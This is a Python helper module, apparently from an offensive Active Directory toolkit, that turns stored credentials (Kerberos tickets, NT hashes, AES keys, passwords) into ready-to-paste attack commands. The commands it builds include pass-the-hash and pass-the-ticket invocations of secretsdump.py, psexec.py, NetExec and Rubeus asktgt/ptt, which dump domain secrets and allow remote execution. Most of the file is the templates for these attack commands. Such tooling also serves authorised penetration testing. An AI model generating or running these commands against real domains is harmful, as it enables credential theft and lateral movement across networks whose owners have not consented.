"""Emit ready-to-paste invocation flags for common AD tooling.

This is a formatting convenience: given the material already stored for an
identity, print the exact flag dialect each tool expects, so you stop hand-
translating the same identity into impacket vs netexec vs Rubeus syntax.

A ccache (ticket) is preferred when available. Secret values are only included
when the caller has revealed them (i.e. the vault was unlocked).
"""
from __future__ import annotations

from typing import List, Optional

TOOLS = ("impacket", "nxc", "rubeus")


def emit(tool: str, *, user: str = "", domain: str = "", target: str = "<target>",
         ccache_path: Optional[str] = None, nt: Optional[str] = None,
         aes256: Optional[str] = None, aes128: Optional[str] = None,
         password: Optional[str] = None) -> List[str]:
    tool = tool.lower()
    if tool not in TOOLS:
        raise ValueError(f"unknown tool {tool!r} (choose from {', '.join(TOOLS)})")

    lines: List[str] = []
    aes = aes256 or aes128

    if tool == "impacket":
        # ticket-based (pass-the-ticket via ccache)
        if ccache_path:
            lines.append(f'export KRB5CCNAME="{ccache_path}"')
            lines.append(f'# e.g. secretsdump.py -k -no-pass {domain}/{user}@{target}')
            lines.append(f'# e.g. psexec.py -k -no-pass {domain}/{user}@{target}')
        if nt:
            lines.append(f"# NT hash:  -hashes :{nt}")
            lines.append(f"secretsdump.py -hashes :{nt} {domain}/{user}@{target}")
        if aes:
            lines.append(f"# AES key:  -aesKey {aes}")
            lines.append(f"secretsdump.py -k -aesKey {aes} {domain}/{user}@{target}")
        if password:
            lines.append(f"secretsdump.py '{domain}/{user}:{password}@{target}'")

    elif tool == "nxc":
        if ccache_path:
            lines.append(f'export KRB5CCNAME="{ccache_path}"')
            lines.append(f"nxc smb {target} --use-kcache")
        if nt:
            lines.append(f"nxc smb {target} -u {user} -H {nt}")
        if aes:
            lines.append(f"nxc smb {target} -u {user} --aesKey {aes}")
        if password:
            lines.append(f"nxc smb {target} -u {user} -p '{password}'")

    elif tool == "rubeus":
        # Rubeus runs on Windows; ccache must be converted to a .kirbi/base64 first.
        lines.append("# Rubeus runs on Windows; convert the ticket to base64 (.kirbi) first.")
        if ccache_path:
            lines.append("Rubeus.exe ptt /ticket:<base64-kirbi>")
        if nt:
            lines.append(f"Rubeus.exe asktgt /user:{user} /domain:{domain} /rc4:{nt} /ptt")
        if aes256:
            lines.append(f"Rubeus.exe asktgt /user:{user} /domain:{domain} /aes256:{aes256} /ptt")
        if password:
            lines.append(f"Rubeus.exe asktgt /user:{user} /domain:{domain} /password:'{password}' /ptt")

    if not lines:
        lines.append(f"# no usable material stored for {user}@{domain}")
    return lines
